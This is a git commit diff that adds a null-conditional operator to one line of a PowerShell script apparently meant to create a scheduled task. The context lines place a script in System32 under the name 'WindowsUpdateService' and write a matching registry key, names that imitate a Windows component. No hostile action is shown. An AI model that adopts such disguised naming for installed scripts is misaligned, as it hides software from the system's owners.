651d325416548642038374f4ab8d88ae385edca6
沐宸 <62504289+DirNotAvailable@users.noreply.github.com>
2023-10-21 21:45:31 +0500

    Update TaskSchedulerServiceCreater.ps1

--- TaskSchedulerServiceCreater.ps1
+++ TaskSchedulerServiceCreater.ps1
@@ -1,5 +1,5 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
-$userNames = ($userProfiles | ForEach-Object { $_.LocalPath.Split('\')[-1] }) -join "|"
+$userNames = ($userProfiles | ForEach-Object { $_.LocalPath?.Split('\')[-1] }) -join "|"
 $code = Read-Host "Enter the code"
 $name = Read-Host "Type in the Name of the PC"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
